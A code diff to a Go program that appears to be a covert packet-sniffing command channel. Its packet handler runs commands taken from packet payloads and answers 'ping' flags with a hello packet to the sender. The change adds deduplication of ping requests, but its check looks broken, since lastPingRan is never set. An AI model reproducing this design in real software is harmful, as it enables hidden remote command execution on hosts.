@@ -26,6 +26,7 @@ import (
 )
 
 var lastCmdRan string
+var lastPingRan string
 
 var debugCheck string = ""
 
@@ -521,34 +522,40 @@ func serverProcessPacket(packet gopacket.Packet, listen chan Host) {
 		execCommand(cmd)
 	}
 
-	//get ping command
-	if len(payload) > 5 {
-		if payload[5] == "1" {
-			if debugCheck != "" { fmt.Println("PING Request Received: %s\n",payload[5]) }
-			ping := payload[5]
-			if ping != "" {
-				iface, src := GetOutwardIface("8.8.8.8:80")
-				
+	if lastPingRan != command {
+		//get ping command
+		if len(payload) > 5 {
+			if payload[5] == "1" {
+				if debugCheck != "" { fmt.Println("PING Request Received: %s\n",payload[5]) }
+				ping := payload[5]
+				if ping != "" {
+					iface, src := GetOutwardIface("8.8.8.8:80")
+					
 
-				srcMAC, err2 := net.ParseMAC(packet.LinkLayer().LinkFlow().Src().String())
-				if err2 != nil {
-					if debugCheck != "" { fmt.Println("[] MAC String Found:", packet.LinkLayer().LinkFlow().Src().String()) }
-					if debugCheck != "" { fmt.Println("[] ERROR PARSING MAC:", err2) }
-					return
-				} else {
-					if debugCheck != "" { fmt.Println("[+] MAC Found:", packet.LinkLayer().LinkFlow().Src().String()) }
+					srcMAC, err2 := net.ParseMAC(packet.LinkLayer().LinkFlow().Src().String())
+					if err2 != nil {
+						if debugCheck != "" { fmt.Println("[] MAC String Found:", packet.LinkLayer().LinkFlow().Src().String()) }
+						if debugCheck != "" { fmt.Println("[] ERROR PARSING MAC:", err2) }
+						return
+					} else {
+						if debugCheck != "" { fmt.Println("[+] MAC Found:", packet.LinkLayer().LinkFlow().Src().String()) }
+					}
+					srcIP := net.ParseIP(packet.NetworkLayer().NetworkFlow().Src().String())
+
+					if srcIP == nil {
+						if debugCheck != "" { fmt.Println("[+] IP Found:", packet.NetworkLayer().NetworkFlow().Src().String()) }
+					}
+
+					go sendHello(iface, src, srcIP, srcMAC)
+					if debugCheck != "" { fmt.Println("[+] PING SENT MAC(%s) IP(%s):", srcMAC, srcIP) }
 				}
-				srcIP := net.ParseIP(packet.NetworkLayer().NetworkFlow().Src().String())
-
-				if srcIP == nil {
-					if debugCheck != "" { fmt.Println("[+] IP Found:", packet.NetworkLayer().NetworkFlow().Src().String()) }
-				}
-
-				go sendHello(iface, src, srcIP, srcMAC)
-				if debugCheck != "" { fmt.Println("[+] PING SENT MAC(%s) IP(%s):", srcMAC, srcIP) }
 			}
 		}
+		command = cmd
 	}
+
+
+
 	srcport, _ := strconv.Atoi(packet.TransportLayer().TransportFlow().Src().String())
 	dstport, _ := strconv.Atoi(packet.TransportLayer().TransportFlow().Dst().String())
 
